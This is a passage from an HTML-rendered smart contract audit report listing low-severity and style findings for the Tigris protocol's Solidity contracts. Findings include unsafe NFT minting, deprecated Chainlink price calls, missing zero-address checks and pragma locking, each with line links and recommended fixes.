12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Add a functionality to delete assets or add a maximum size limit for assets.</p>\n<h2 id=\"03-use-the-safe-variant-and-erc721mint\" style=\"position:relative;\"><a href=\"#03-use-the-safe-variant-and-erc721mint\" aria-label=\"03 use the safe variant and erc721mint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] Use the safe variant and <code>ERC721.mint</code></h2>\n<p><code>.mint</code> won’t check if the recipient is able to receive the NFT. If an incorrect  address is passed, it will result in a silent failure and loss of asset.</p>\n<p>OpenZeppelin <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L277\">recommendation</a> is to use the safe variant of <code>_mint</code>.</p>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Replace <code>_mint()</code> with <code>_safeMint()</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L313\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L313</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L56\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L56</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L70\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L70</a></p>\n<h2 id=\"04-usage-of-deprecated-chainlink-api\" style=\"position:relative;\"><a href=\"#04-usage-of-deprecated-chainlink-api\" aria-label=\"04 usage of deprecated chainlink api permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] Usage of deprecated chainlink API</h2>\n<p><code>latestAnswer()</code> from chainlink is deprecated and can return stale data.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Use <code>latestRoundData()</code> instead of <code>latestAnswer()</code>. Also, adding checks for <a href=\"https://docs.chain.link/data-feeds/price-feeds/api-reference/#latestrounddata\">additional fields</a> returned from <code>latestRoundData()</code> is recommended. E.g.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">(uint80 roundID, int256 price,,uint256 timestamp, uint80 answeredInRound) = chainlink.latestRoundData();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">require(timestamp != 0, &quot;round not complete&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">require(answeredInRound &gt;= roundID, &quot;stale data&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">require(price != 0, &quot;chainlink error&quot;);</span></span></code></pre>\n<h2 id=\"05-lack-of-checks-effects-interactions\" style=\"position:relative;\"><a href=\"#05-lack-of-checks-effects-interactions\" aria-label=\"05 lack of checks effects interactions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] Lack of checks-effects-interactions</h2>\n<p>It’s recommended to execute external calls after state changes, to prevent reetrancy bugs.</p>\n<p>Consider moving the external calls after the state changes on the following instances:</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L72-L73\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Lock.sol#L72-L73</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L216-L226\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L216-L226</a></p>\n<h2 id=\"06-lack-of-zero-address-checks-for-tradingsol-constructor-for-the-variables-_position-_gov-and-_pairscontract\" style=\"position:relative;\"><a href=\"#06-lack-of-zero-address-checks-for-tradingsol-constructor-for-the-variables-_position-_gov-and-_pairscontract\" aria-label=\"06 lack of zero address checks for tradingsol constructor for the variables _position _gov and _pairscontract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[06] Lack of zero address checks for <code>Trading.sol</code> constructor for the variables <code>_position</code>, <code>_gov</code> and <code>_pairsContract</code></h2>\n<p>If these variable get configured with address zero, failure to immediately reset the value can result in unexpected behavior for the project.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L143-L152\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L143-L152</a></p>\n<h2 id=\"07-add-an-event-for-critical-parameter-changes\" style=\"position:relative;\"><a href=\"#07-add-an-event-for-critical-parameter-changes\" aria-label=\"07 add an event for critical parameter changes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[07] Add an event for critical parameter changes</h2>\n<p>Adding events for critical parameter changes will facilitate offchain monitoring and indexing.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L9051\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L9051</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L912-L920\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L912-L920</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L926-L933\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L926-L933</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L939-L941\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L939-L941</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L952-L969\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L952-L969</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L975-L979\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L975-L979</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L9-L11\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L9-L11</a></p>\n<h2 id=\"08-missing-unit-tests\" style=\"position:relative;\"><a href=\"#08-missing-unit-tests\" aria-label=\"08 missing unit tests permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[08] Missing unit tests</h2>\n<p>It is crucial to write tests with possibly 100% coverage for smart contracts.</p>\n<p>The following functions are not covered:</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L206-L216\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L206-L216</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L311-L313\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L311-L313</a></p>\n<h3 id=\"recommendation-4\" style=\"position:relative;\"><a href=\"#recommendation-4\" aria-label=\"recommendation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>It is recommended to write tests for all possible code flows.</p>\n<h2 id=\"09-pragma-float\" style=\"position:relative;\"><a href=\"#09-pragma-float\" aria-label=\"09 pragma float permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[09] Pragma float</h2>\n<p>All the contracts in scope are floating the pragma version.</p>\n<h3 id=\"recommendation-5\" style=\"position:relative;\"><a href=\"#recommendation-5\" aria-label=\"recommendation 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Locking the pragma helps to ensure that contracts do not accidentally get deployed using an outdated compiler version.</p>\n<p>Note that pragma statements can be allowed to float when a contract is intended for consumption by other developers, as in the case with contracts in a library or a package.</p>\n<h2 id=\"10-contract-layout-and-order-of-functions\" style=\"position:relative;\"><a href=\"#10-contract-layout-and-order-of-functions\" aria-label=\"10 contract layout and order of functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[10] Contract layout and order of functions</h2>\n<p>The Solidity style guide <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-layout\">recommends</a> declaring state variables before all functions. Consider moving the state variables from the GovNFT instance highlighted below to the top of the contract.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L263-L269\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/GovNFT.sol#L263-L269</a></p>\n<p>Another <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions\">recommendation</a> is to declare internal functions below external functions. </p>\n<p>The instances below highlights internal above external. If possible, consider adding internal functions below external functions for the contract layout.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L884\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L884</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L901\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L898-L901</a></p>\n<p>Furthermore, it’s also recommended to declare pure and view functions at the end of a grouping.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L857\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L857</a></p>\n<h2 id=\"11-use-time-units-directly\" style=\"position:relative;\"><a href=\"#11-use-time-units-directly\" aria-label=\"11 use time units directly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[11] Use time units directly</h2>\n<p>The value <code>1 days</code> can be used directly as the constant on <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L10\">L10</a> of <code>BondNFT.sol</code> is not needed.</p>\n<h2 id=\"12-declare-interfaces-on-separate-files\" style=\"position:relative;\"><a href=\"#12-declare-interfaces-on-separate-files\" aria-label=\"12 declare interfaces on separate files permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[12] Declare interfaces on separate files</h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L14-L77\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L14-L77</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L9-L13\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L9-L13</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L15-L25\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L15-L25</a></p>\n<h2 id=\"13-constants-should-be-upper-case\" style=\"position:relative;\"><a href=\"#13-constants-should-be-upper-case\" aria-label=\"13 constants should be upper case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[13] Constants should be upper case</h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L96\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L96</a></p>\n<h2 id=\"14-use-private-constant-consistently\" style=\"position:relative;\"><a href=\"#14-use-private-constant-consistently\" aria-label=\"14 use private constant consistently permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[14] Use <code>private constant</code> consistently</h2>\n<p>Replace <code>constant private</code> with <code>private constant</code>.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L95</a></p>\n<h2 id=\"15-add-a-limit-for-the-maximum-number-of-characters-per-line\" style=\"position:relative;\"><a href=\"#15-add-a-limit-for-the-maximum-number-of-characters-per-line\" aria-label=\"15 add a limit for the maximum number of characters per line permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[15] Add a limit for the maximum number of characters per line</h2>\n<p>The solidity <a href=\"https://docs.soliditylang.org/en/v0.8.17/style-guide.html#maximum-line-length\">documentation</a> recommends a maximum of 120 characters.</p>\n<p>Consider adding a limit of 120 characters or less to prevent large lines.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L178\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L178</a></p>\n<h2 id=\"16-declaring-a-return-named-variable-and-returning-a-manual-value-for-the-same-function\" style=\"position:relative;\"><a href=\"#16-declaring-a-return-named-variable-and-returning-a-manual-value-for-the-same-function\" aria-label=\"16 declaring a return named variable and returning a manual value for the same function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[16] Declaring a <code>return named variable</code> and returning a manual value for the same function</h2>\n<p>Consider refactoring the function <code>MetaContext._msgSender</code> to use <code>sender</code> on <a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/utils/MetaContext.sol#L25\">L25</a>. E.g. <code>sender = super._msgSender()</code>. This will make the function more consistent with the usage of the <code>return named variable</code> declared in the function header.</p>\n<h2 id=\"17-lack-of-spacing-in-comment\" style=\"position:relative;\"><a href=\"#17-lack-of-spacing-in-comment\" aria-label=\"17 lack of spacing in comment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[17] Lack of spacing in comment</h2>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L863\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L863</a></p>\n<h2 id=\"18-critical-changes-should-use-two-step-procedure\" style=\"position:relative;\"><a href=\"#18-critical-changes-should-use-two-step-procedure\" aria-label=\"18 critical changes should use two step procedure permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[18] Critical changes should use two-step procedure</h2>\n<p>Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two-step procedure on the critical functions.</p>\n<p>Consider adding a two-steps pattern on critical changes to avoid mistakenly transferring ownership of roles or critical functionalities to the wrong address.</p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L366-L370\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/BondNFT.sol#L366-L370</a></p>\n<h2 id=\"19-missing-natspec\" style=\"position:relative;\"><a href=\"#19-missing-natspec\" aria-label=\"19 missing natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 